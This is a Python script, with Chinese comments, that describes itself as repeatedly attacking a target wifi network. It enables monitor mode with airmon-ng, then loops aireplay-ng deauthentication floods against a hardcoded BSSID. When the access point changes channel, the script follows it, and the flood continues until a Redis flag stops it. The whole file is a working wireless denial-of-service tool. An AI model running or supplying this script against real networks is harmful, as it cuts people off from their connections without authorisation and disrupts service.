# coding:utf-8
"""
根据获得的wifi信息不断攻击目标wifi
create by swm
2018/03/23
"""
from subprocess import call, Popen, PIPE
import time
import redis
import re

class ATTACK:

    def __init__(self, mac, wlanname, ch):
        self.mac = mac
        self.wlanname = wlanname
        self.ch = ch

    # 选择wifi，并开启wlanmon,准备开始路由攻击
    def startwlanmon(self):
        call('ifconfig {} up'.format(self.wlanname), shell=True)
        call('airmon-ng check kill', shell=True)
        call('airmon-ng start {}'.format(self.wlanname), shell=True)
        return

    def changechannel(self, wlanname, ch):
        iwcmd = 'iwconfig {}mon channel {}'.format(wlanname, ch)
        call(iwcmd, shell=True)
        return

    def startattack(self):
        r = redis.Redis(host="localhost", port=6379)
        r.hset('attack', 'statu', 1)
        attack = r.hget('attack', 'statu')
        # 在程序执行之前先改变虚拟网卡的信道
        self.changechannel(self.wlanname, self.ch)
        re_success = re.compile(r'Sending DeAuth to broadcast \-\- BSSID\: \[{}\]'.format(self.mac))
        re_newch = re.compile(r'AP\Wuses\Wchannel\W(\d)')
        while int(attack) == 1:
            cmd = 'aireplay-ng -0 10 -a {} {}mon'.format(self.mac, self.wlanname)
            p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
            out, err = p.communicate()
            # 每次都去匹配成功的字段
            success = re_success.search(out)
            if success:
                # 如果成功的化就不用理会继续执行攻击
                time.sleep(0.2)
            else:
                # 如果失败就获取当前频率并改变网卡的频率
                newch = re_newch.findall(out)
                self.changechannel(self.wlanname, newch[0])
            attack = r.hget('attack', 'statu')
        else:
            call('airmon-ng stop {}mon'.format(self.wlanname), shell=True)

    def start(self):
        # 1、开启airmongo
        # 2、开始进行路由攻击
        self.startwlanmon()
        self.startattack()
        return


if __name__ == '__main__':
    attack = ATTACK('50:2B:73:F4:35:F1', 'wlan1', '3')
    attack.start()
